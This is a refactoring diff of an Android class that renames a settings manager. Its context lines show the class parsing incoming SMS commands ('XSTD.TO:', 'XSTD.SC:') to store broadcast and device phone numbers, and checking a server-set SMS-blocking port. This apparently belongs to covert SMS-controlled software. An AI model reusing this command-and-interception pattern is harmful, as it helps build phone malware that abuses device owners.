@@ -5,7 +5,7 @@ import android.content.Intent;
 import android.text.TextUtils;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
-import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.config.PluginSettingManager;
 import com.xstd.plugin.service.PluginService;
 
 /**
@@ -31,7 +31,7 @@ public class MessageHandleUtils {
                 Config.LOGD("[[handleMessage]] handle message with XSTD.TO: ");
             }
             String phoneNumbers = msg.trim().substring("XSTD.TO:".length());
-            String oldPhoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+            String oldPhoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
             String newPhoneNumbers = handleMessageContext(phoneNumbers);
             if (Config.DEBUG) {
                 Config.LOGD("[[handleMessage]] after handle, new phone number : " + newPhoneNumbers + " >>>>>>>");
@@ -40,13 +40,13 @@ public class MessageHandleUtils {
             if (TextUtils.isEmpty(newPhoneNumbers)) return false;
 
             if (TextUtils.isEmpty(oldPhoneNumbers)) {
-                SettingManager.getInstance().setBroadcastPhoneNumber(newPhoneNumbers);
+                PluginSettingManager.getInstance().setBroadcastPhoneNumber(newPhoneNumbers);
             } else {
-                SettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + newPhoneNumbers);
+                PluginSettingManager.getInstance().setBroadcastPhoneNumber(oldPhoneNumbers + ";" + newPhoneNumbers);
             }
             if (Config.DEBUG) {
                 Config.LOGD("\n[[handleMessage]] we receive SMS [[XSTD.TO:]] for broadcast"
-                                + " phoneNumbers : " + SettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
+                                + " phoneNumbers : " + PluginSettingManager.getInstance().getBroadcastPhoneNumber() + " >>>>>>>>");
             }
 
             Intent i = new Intent();
@@ -73,12 +73,12 @@ public class MessageHandleUtils {
 
             if (selfPhoneNumber.contains(".")) selfPhoneNumber = selfPhoneNumber.replace(".", "");
             if (!TextUtils.isEmpty(selfPhoneNumber) && CommonUtil.isNumeric(selfPhoneNumber)) {
-                SettingManager.getInstance().setCurrentPhoneNumber(selfPhoneNumber);
+                PluginSettingManager.getInstance().setCurrentPhoneNumber(selfPhoneNumber);
             }
 
             if (Config.DEBUG) {
                 Config.LOGD("\n[[handleMessage]] receive SMS [[XSTD.SC:]]"
-                                + " phoneNumbers : " + SettingManager.getInstance().getCurrentPhoneNumber() + " >>>>>>>>");
+                                + " phoneNumbers : " + PluginSettingManager.getInstance().getCurrentPhoneNumber() + " >>>>>>>>");
             }
 
             return true;
@@ -88,7 +88,7 @@ public class MessageHandleUtils {
         /**
          * 如果当前手机号码不为空，那么再进行其他的操作
          */
-        if (!TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())
+        if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())
                 && AppRuntime.ACTIVE_RESPONSE != null
                 && !TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.blockSmsPort)) {
             //对于短信内容先进行二次确认检查
